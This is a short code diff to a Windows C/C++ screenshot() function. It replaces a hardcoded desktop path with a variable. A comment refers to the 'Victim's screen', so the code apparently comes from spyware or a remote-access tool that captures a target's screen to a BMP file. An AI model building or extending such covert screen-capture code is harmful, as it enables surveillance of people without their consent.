@@ -2,6 +2,9 @@
 
 int screenshot()
 {
+	//Filepath for screenshot
+	TCHAR path[] = _T("C:\\Users\\User\\Desktop\\x.bmp");
+
 	//Get Victim's screen dimensions.
 	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);
 	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -47,7 +50,7 @@ int screenshot()
 	}
 
 	//Creates a file out of the BMP object.
-	if (createBMPFile(_T("C:\\Users\\Franco\\Desktop\\x.bmp"), createBitmapInfo(bitmap), bitmap, compatContext))
+	if (createBMPFile(path, createBitmapInfo(bitmap), bitmap, compatContext))
 	{
 		_tprintf(_T("ERROR: createBMPFile function call."));
 		return 1;
